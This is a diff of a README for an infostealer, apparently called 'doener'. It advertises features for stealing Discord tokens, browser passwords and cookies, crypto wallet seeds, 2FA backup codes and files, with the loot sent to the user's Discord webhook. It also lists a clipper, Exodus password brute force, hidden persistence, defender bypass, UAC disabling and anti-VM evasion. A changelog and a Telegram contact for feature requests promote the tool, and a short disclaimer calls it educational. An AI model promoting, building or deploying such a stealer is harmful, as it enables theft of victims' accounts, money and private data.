@@ -22,7 +22,7 @@ Important to know about the old doener
 
 - [📁 Setting up](#setup)
 - [⚔️ Features](#features)
-- [📝 Todo](#todo)
+- [📝 Change Logs](#changelogs)
 - [📜 License](#license)
 - [⚠️ Note](#note)
 
@@ -44,80 +44,77 @@ Important to know about the old doener
 
 ## ⚔️ 〢 Features
 
-#### Stealer
+```
+🎲 No Dependent Clipper (exe does not need to stay running for the clipper to work)
 
-> No Dependent Clipper (exe does not need to stay running for the clipper to work)
->
-> Wallet Injection 12words + passwords [ Exodus, Atomic ]
-> 
-> Percistance Hidden Startup + if reg get deleted = auto come back :)
->
-> Files Stealer [.txt, .doc, .docx, .rdp, .pdf and more]
->
-> Binder, will add exclusion to your file to bypass defender.
-> 
-> Discord Token, Friends with rare badges, Credit card
->
-> Discord Info - Username, Phone number, Email, Billing, Nitro Status & Backup Codes
->
-> Discord About Me changer, HQ Guilds Admin/Owner
->
-> Steal Backup 2FA Code [ Discord, Epic Games, Github ]
->
-> Crypto Wallets (Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, Electrum, AtomicWallet, Guarda, Coinomi, MetaMask
-> 
-> Browser (Chrome, Opera, Firefox, OperaGX, Edge, Brave, Yandex) -
->
-> Passwords, Cookies, Autofill & History (Searches for specific keywords such as PayPal, Coinbase etc. in them)
->
-> Screenshots all screen
->
-> FTP Client (FileZilla)
->
-> Games Clients (Growtopia, Steam, Minecraft, Epic Games, Riot Games
->
-> Messengers Clients (Telegram)
->
-> Sessions (Reddit, Twitter, TikTok, Steam, Roblox, Instagram, Minecraft, Riot Games)
+📊 Wallet Injection 12words + passwords (Exodus, Atomic) for Telegram and Discord
 
-### 🏹 〢 Additional
+🚗 Exodus Password BruteForce
 
-> Internet connection check every 3 seconds before it starts stealing
->
-> Ultra Obfuscation (use https://js-confuser.com/)
->
-> Disable UAC / Anti-Debug / Anti-VM / Blue Screen if detect
->
-> Validates a found discord token and then sends it to your discord webhook
->
-> Sends all files to your discord webhook in beautiful embeds and a structured zip file
->
-> Automatic obfuscation when building (12 sec to build exe | 30-40mb)
+💾 Percistance Hidden Startup + if reg get deleted = auto come back :)
 
+🗂️ Files Stealer [.txt, .doc, .docx, .rdp, .pdf and more]
 
+🔒 Binder, will add exclusion to your file to bypass defender.
 
-<a id="todo">📝 〢 Todo</a>
+⏲️ Discord Token, Friends with rare badges, Credit card
 
-> - ~~Exodus wallet injection (get the password whenever the user logs in the wallet)~~
-> - More grabbers (VPN's, Gaming, Messengers)
-> - <strike>Clipper</strike>
-> - Telegram bot to build within Telegram
-> - <strike>Stable Version recive log by Telegram</strike>
-> - <strike>Firefox stealer</strike>
-> - <strike>GET NEW COOKIES</strike>
-> - [Click here](https://discord.gg/doenerium) to request new features that you would like to see in the next version of our software ?
+💳 Discord Info - Username, Phone number, Email, Billing, Nitro Status & Backup Codes
+
+🖼️ Discord About Me changer, HQ Guilds Admin/Owner
+
+📁 Steal Backup 2FA Code [ Discord, Epic Games, Github ]
+
+🧊 Crypto Wallets (Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, Electrum, AtomicWallet, Guarda, Coinomi, MetaMask
+ 
+📝 Browser (Chrome, Opera, Firefox, OperaGX, Edge, Brave, Yandex) -
+
+🤔 Get Gecko Cookies and Passwords
+
+🍪 Get New Chromium Cookies, Passwords, Autofill & History (Searches for specific keywords such as PayPal, Coinbase etc. in them)
+
+🧩 Screenshots all screen
+
+💻 FTP Client (FileZilla)
+
+🎮 Games Clients (Growtopia, Steam, Minecraft, Epic Games, Riot Games
+
+🎹 Messengers Clients (Telegram)
+
+📋 Sessions (Reddit, Twitter, TikTok, Steam, Roblox, Instagram, Minecraft, Riot Games)
+ 
+🤖 Internet connection check every 3 seconds before it starts stealing
+
+🎭 Ultra Obfuscation (use https://js-confuser.com/)
+
+👁️ Disable UAC / Anti-Debug / Anti-VM / Blue Screen if detect
+
+🪓 Validates a found discord token and then sends it to your discord webhook
+
+⛽️ Sends all files to your discord webhook in beautiful embeds and a structured zip file
+
+🪐 Automatic obfuscation when building and compress with Gzip
+ 
+🎯 DM @vatlarp on Telegram to request new features that you would like to see in the next version of our software!
+```
+
+<a id="changelogs"></a>
+
+📝 〢 Change Logs
+
+```
+- v0.9 removed dualhook
+- v1.0 added gecko cookies and passwords + new chromium cookies + exodus bruteforce + growtopia + wallet injection for telegram and discord + updated obfuscation module + changed path for logs + remvoed all useless code + removed discord bio force change + better execution of function + better error handler
+```
+
 <a id="license"></a>
 
-
-
-### 📜 〢 License
+## 📜 〢 License
 
 By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see [commonsclause](https://commonsclause.com/)
 
 <a id="note"></a>
 
-
-
-### ⚠️ 〢 Note
+##  ⚠️ 〢 Note
 
 I am not responsible for any damages this software may cause after being acquired. This software was made for personal education and sandbox testing.
